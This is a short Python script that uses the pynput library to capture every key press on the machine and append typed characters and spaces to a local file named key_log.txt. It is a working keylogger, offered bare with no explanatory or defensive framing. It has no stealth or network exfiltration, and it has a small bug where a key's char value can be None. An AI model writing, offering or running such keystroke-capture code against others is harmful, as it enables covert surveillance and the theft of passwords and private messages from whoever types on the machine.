from pynput import keyboard
def write_key_to_file(key):
    with open("key_log.txt", "a") as f:
        if hasattr(key, "char"):
            f.write(key.char)
        elif key == keyboard.Key.space:
            f.write(" ")
def on_press(key):
    write_key_to_file(key)
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
